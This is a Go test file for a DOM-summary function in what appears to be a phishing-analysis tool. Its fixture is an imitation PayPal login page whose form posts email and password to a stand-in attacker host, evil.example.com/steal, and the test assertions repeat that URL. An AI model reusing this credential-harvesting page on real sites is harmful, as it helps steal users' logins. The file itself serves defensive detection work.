package hypothesis_test

import (
	"strings"
	"testing"

	"github.com/aslanchik/go-phish/internal/fetcher"
	"github.com/aslanchik/go-phish/internal/hypothesis"
)

const sampleDOM = `<!DOCTYPE html>
<html lang="en">
<head>
  <title>PayPal: Log in to your account</title>
  <meta name="description" content="Secure login to your PayPal account.">
  <script>var x = "should not appear";</script>
  <style>body { color: red; }</style>
</head>
<body>
  <h1>Log in</h1>
  <p>Enter your credentials below.</p>
  <form action="https://evil.example.com/steal" method="POST">
    <input name="email" type="email">
    <input name="password" type="password">
    <input name="submit" type="submit" value="Log In">
  </form>
</body>
</html>`

var sampleForms = []fetcher.Form{
	{
		Action: "https://evil.example.com/steal",
		Method: "post",
		Fields: []fetcher.FormField{
			{Name: "email", Type: "email"},
			{Name: "password", Type: "password"},
		},
	},
}

func TestDOMSummary_Title(t *testing.T) {
	s, err := hypothesis.DOMSummary(sampleDOM, nil)
	if err != nil {
		t.Fatalf("DOMSummary: %v", err)
	}
	if s.Title != "PayPal: Log in to your account" {
		t.Errorf("got title %q, want %q", s.Title, "PayPal: Log in to your account")
	}
}

func TestDOMSummary_MetaDescription(t *testing.T) {
	s, err := hypothesis.DOMSummary(sampleDOM, nil)
	if err != nil {
		t.Fatalf("DOMSummary: %v", err)
	}
	if s.Description != "Secure login to your PayPal account." {
		t.Errorf("got description %q, want %q", s.Description, "Secure login to your PayPal account.")
	}
}

func TestDOMSummary_FormsPassedThrough(t *testing.T) {
	s, err := hypothesis.DOMSummary(sampleDOM, sampleForms)
	if err != nil {
		t.Fatalf("DOMSummary: %v", err)
	}
	if len(s.Forms) != 1 {
		t.Fatalf("got %d forms, want 1", len(s.Forms))
	}
	if s.Forms[0].Action != "https://evil.example.com/steal" {
		t.Errorf("got form action %q, want evil.example.com/steal", s.Forms[0].Action)
	}
}

func TestDOMSummary_VisibleTextExcludesScriptStyle(t *testing.T) {
	s, err := hypothesis.DOMSummary(sampleDOM, nil)
	if err != nil {
		t.Fatalf("DOMSummary: %v", err)
	}
	if strings.Contains(s.VisibleText, "should not appear") {
		t.Error("visible text contains script content")
	}
	if !strings.Contains(s.VisibleText, "Log in") {
		t.Error("visible text missing body content")
	}
}

func TestDOMSummary_VisibleTextTruncated(t *testing.T) {
	// Build a DOM with more than 2000 chars of visible text.
	long := strings.Repeat("word ", 500) // 2500 chars
	dom := "<html><body><p>" + long + "</p></body></html>"
	s, err := hypothesis.DOMSummary(dom, nil)
	if err != nil {
		t.Fatalf("DOMSummary: %v", err)
	}
	if len(s.VisibleText) > 2000 {
		t.Errorf("visible text length %d exceeds 2000", len(s.VisibleText))
	}
}

func TestDOMSummary_StringUnder2500Chars(t *testing.T) {
	s, err := hypothesis.DOMSummary(sampleDOM, sampleForms)
	if err != nil {
		t.Fatalf("DOMSummary: %v", err)
	}
	out := s.String()
	if len(out) > 2500 {
		t.Errorf("String() length %d exceeds 2500", len(out))
	}
	t.Logf("summary length: %d chars\n%s", len(out), out)
}
